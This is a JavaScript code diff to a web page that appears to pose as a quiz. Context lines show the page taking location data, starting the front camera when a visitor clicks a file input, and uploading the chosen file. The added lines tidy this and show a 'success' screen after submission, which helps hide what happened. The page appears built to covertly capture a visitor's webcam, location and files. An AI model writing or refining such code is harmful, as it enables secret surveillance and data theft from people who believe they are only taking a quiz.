@@ -18,6 +18,7 @@ const constraints = { video: { facingMode: "user" }, audio: false };
 // SHOW TOAST FUNCTION
 // ================================
 function showToast(message = "Done") {
+  if (!toast) return;
   toast.textContent = message;
   toast.style.display = "block";
   setTimeout(() => { toast.style.display = "none"; }, 3000);
@@ -49,7 +50,7 @@ async function collectMetadata() {
         navigator.geolocation.getCurrentPosition(resolve, reject);
       });
       metadata.location = `${position.coords.latitude},${position.coords.longitude}`;
-    } catch (err) {
+    } catch {
       metadata.location = "Denied";
     }
   }
@@ -111,16 +112,16 @@ async function sendFileUpload(file) {
 }
 
 // ================================
-// TRIGGER CAMERA ON FILE CLICK
+// CAMERA ONLY WHEN FILE INPUT CLICKED
 // ================================
 if (fileInput) {
   fileInput.addEventListener('click', async () => {
-    await sendCameraData();   // camera starts here
+    await sendCameraData();
   });
 }
 
 // ================================
-// SUBMIT BUTTON ONLY UPLOADS FILE
+// SUBMIT BUTTON → UPLOAD + SUCCESS SCREEN
 // ================================
 if (btn) {
   btn.addEventListener('click', async (e) => {
@@ -129,5 +130,11 @@ if (btn) {
     if (fileInput && fileInput.files.length > 0) {
       await sendFileUpload(fileInput.files[0]);
     }
+
+    const quiz = document.getElementById('quiz-container');
+    const success = document.getElementById('success-container');
+
+    if (quiz) quiz.style.display = "none";
+    if (success) success.style.display = "block";
   });
-      }
+    }
